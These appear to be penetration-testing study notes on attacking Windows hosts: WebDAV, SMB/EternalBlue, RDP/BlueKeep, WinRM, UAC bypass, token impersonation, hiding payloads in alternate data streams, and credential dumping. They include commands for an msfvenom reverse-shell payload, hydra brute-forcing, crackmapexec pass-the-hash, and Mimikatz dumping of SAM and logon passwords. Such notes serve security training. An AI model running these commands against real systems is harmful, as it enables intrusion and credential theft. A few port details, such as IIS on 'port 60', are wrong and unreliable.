Host Based attacks

- Introduction to host based attacks
    - Attacks targeted to towards a specific system or host running a specific operating system
    - These attacks are focused on exploiting inherent vulnerabilites on the target OS 

Windows Vulnerabilities

- Overview of Windows vulnerabilities
    - Windows is the dominant operating system (>= 70% market share)
    - Popular vulns: EternalBlue, Conflicker
    - Windows OS's have benn developed in the C programming language, making them vulnerable to buffer overflows
    - By default, Windows is not configured to run securely
    - New vulnerabilities are not patched immediately
    - Types of Windows vulnerabilities:
        1. Information disclosure
        2. Buffer overflows
        3. Remote code execution (RCE)
        4. Privilege escalation 
        5. Denial of Service
    
- Frequently exploited Windows services
    - Windows has various native services and protocols that can be run on a host
    - Microsoft IIS
        - Web server technology
        - TCP port 60 or 443
    - WebDAV
        - HTTP extension that allows clients to modify files on a web server
        - TCP port 80 or 443
    - SMB/CIFS
        - Network file sharing 
        - TCP port 445
    - RDP (Remote Desktop Protocol)
        - GUI remote access protocol 
        - TCP port 3389
    - WinRM
        - Windows remote management protocol for remote access 
        - TCP port 5986 or 443

- Exploiting WebDav running in Microsoft IIS
    - ASP.NET or php
    - TCP port 80 or 443
    - WebDAV is used for manage files collaboratively
    - Check if WebDAV is running
    - Bruteforce credentials
    - Upload malicious .asp file to gain access to the server
        - /usr/share/webshells/asp/webshell.asp
    - davtest, cadaver
        - davtest -auth user:pass -url http://<ip>/webdav +
        - cadaver http://<ip>/webdav
    - Hydra can be used to brute force credentials
        - hydra -L <users> -P <passwords> <ip> http-get <path to webdav>

- Exploiting WebDAV with metasploit
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f asp > shell.asp
    - in msfconsole:
        - use multi/handler

- Exploiting SMB with PsExec
    - SMB authentication
        - Authentication req -->
        - Encrypt string with user's hash <--
        - Encrypted string -->
        - Access granted <--
    - PsExec is a telnet replacement that allows to execute processes on remote windows systems
    - PsExec uses SMB authentication

- Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)
    - EternalBlue is the name given to a collection of Windows vulnerabilites and exploits to perform RCEs and gain access to Windows systems
    - Developed by NSA
    - Vulnerabilities affect windows versions form Vista to 10
    - Can be exploited using MSF modules or manually with public code
    - AutoBlue (different scripts for different windows versions)

- Exploiting RDP
    - Remote Desktop Protocol (TCPP port 3389)
    - Typical bruteforce attacks
    - RDP can be configured to run on any TCP port
    - RDP_scanner is an auxiliary MSF module to check for RDP
    - Hydra can be used to bruteforce credentials
    - xfreerdp is a client to connect via rdp
        - xfreerdp /u:administrator /p:qwertyuiop /v:10.2.20.34:3333

- Exploiting Windows CVE-2019-0708 (BlueKeep)
    - RDP vulnerability that could potentially allow attackers to remotely execute code
    - Made public by Microsoft in 2019
    - Attackers gain access to a chunk of kernel memory (elevated privileges)
    - MSF has auxiliary and exploit modules
    - Targeting kernel space memory and applications can cause crashes

- Exploiting WinRM
    - Windows remote management that can be used to remote access to systems over HTTPS
    - Tipically uses TCP port 5985 and 5986
    - crackmapexec (brute-force)
        - crackmapexec winrm <IP> -u administrator -p <password_wordlist>
        - crackmapexec winrm <IP> -u administrator -p <password> -x "<command>"
    - evil-winrm (ruby script to get a session)
        - evil-winrm.rb -u administrator -p <password> -i <IP> 
    
Windows privilege escalation

- Windows Kernel exploits
    - Privilege escalation is the process of pivoting from one user to another with more privileges
    - A kernel is a computer program that is the core of an operating system, it has complete control over every resource and hardware of the system
    - Windows kernel: Windows NT
        - User mode: limited resources
        - Kernel mode: unresetricted access to system resources + can manage devices and system memory
    - Different versions of windows need different kernel exploits
        1. Identify kernel vulnerabilites
        2. Download, compile and transfer exploit scripts to the target system
    - Tools
        - Windows-Exploit-Suggester (https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
        - Windows-Kernel-Exploits (https://github.com/SecWiki/windows-kernel-exploits)
    - In MSF: local_exploit_suggester

- Bypassing UAC with UACMe
    - UAC (User account control)
    - Windows security feature used to prevent unauthorized changes from being made to the operating system
    - A non-privileged user will be prompted with the UAC credential prompt
    - A privileged user will be prompeted with the consent prompt
    - To bypass UAC access to a user account what is a part of the local administrators group is needed
    - UAC has different integrity levels from low to high. If set below high, programs can be executed with elevated privileges without prompting the user
    - Tool:
        - UACMe (https://github.com/hfiref0x/UACME)
        
- Access Token impersonation
    - Windows access tokens are a core element of the authetication process in Windows systems
    - A token is used so users do not have to provide credentials every time a process is started or a resource is accessed
    - Access tokens are generated by winlogon.exe process. The token is attached to the userinit.exe process. All child processes inherit a copy
    - Access tokens are asigned on security level:
        - Impersonate-level: created as a result of non-interactive login
        - Delegate-level: interactive login such as RDP
    - Impersonate-level tokens can be used to impersonate a token on the local system ONLY
    - Delegate-level tokens can be used to impersonate a token on any system that utilizes the token
    - Privileges that are required for a successful attack:
        - SeAssignPrimaryToken: allows impersonate tokens
        - SeCreateToken: allows create an arbitrary token with administrative privileges 
        - SeImpersonatePrvilege: allows create a process under the security context of another user 
    - MSF module:
        - Incognito: list impersonation tokens and impersonate tokens
            - list_tokens -u
            - impersonate_token "<user>"
    - Potato attacks

Windows filesystem vulnerabilites
    
- Alternate Data Streams
    - ADS is an NTFS (New technology file system) file attribute and was designed to provide compatibility with MacOS file system
    - Any file created on an NTFS will have 2 streams or forks:
        1. Data stream: data of the file
        2. Resource stream: metadata
    - Attackers can use ADS to hide malicious code in legitimate files in order to evade detection
    - This can be done by storing the malicious code or executables in the metadata
    - notepad test.txt:secret.txt
    - type payload.exe > legitimate.txt:malicious.exe
    - start legitimate.txt:malicious.exe

Windows Credential Dumping

- Windows Password Hashes
    - Windows stores hashed user account passwords locally in the SAM database
    - Two types of hashes   
        - LM 
        - NTLM (used after Windows Visa)
    - The SAM database file cannot be copied while the OS is running
    - In modern versions of Windows, the SAM database is encrypted with a syskey
    - LM is the default hashing algorithm prior to NT4.0
        1. The password is broken into two seven-character chunks
        2. All characters are then converted into uppercase
        3. Each chunk is then hashed separately with the DES algorithm 
    - NTLM is a collection of authentication protocols
    - NTLM is improves LM: 
        - Does not split the hash
        - Is case sensitive
        - Allows the use of symbols and unicode characters
        - Uses MD4

- Searching for passwords in Windows configuration files
    - Unattended Windows Setup utility is often used to automate the mass installation of Windows on systems
    - This tool uses configuration files that contain account credentials
    - These files are often left on the target after installation
        - C:\Windows\Panther\Unattend.xml
        - C:\Windows\Panther\Autounattend.xml
    - Credentials might be stored in base64
    
- Dumping hashes with Mimikatz
    - Mimikatz is a post-exploitation tool for the extraction of clear-text passwords, hashes and Kerberos tickets
    - Mimikatz can be used to extract hashes from the lsass.exe process
    - Meterpreter has an inbuilt extension called Kiwi
    - It needs elevated privileges
    - MSF   
        - load kiwi 
        - creds_all
        - lsa_dump_sam
        - lsa_dump_secrets
        - upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
    - mimikatz.exe
        - privilege::debug
        - lsadump::sam
        - lsadump::secrets
        - sekurlsa::logonpasswords

- Pass-The-Hash Attacks
    - Technique that involves capturing NTLM or clear-text passwords and using them to authenticate with the target
    - Psexec, crackmapexec are tools that can facilitate pass-the-hash
        - SMBPass can be the LM:NTLM hash
    - crackmapexec smb <ip> -u Administrator -H "<NTLM>" -x "<command>"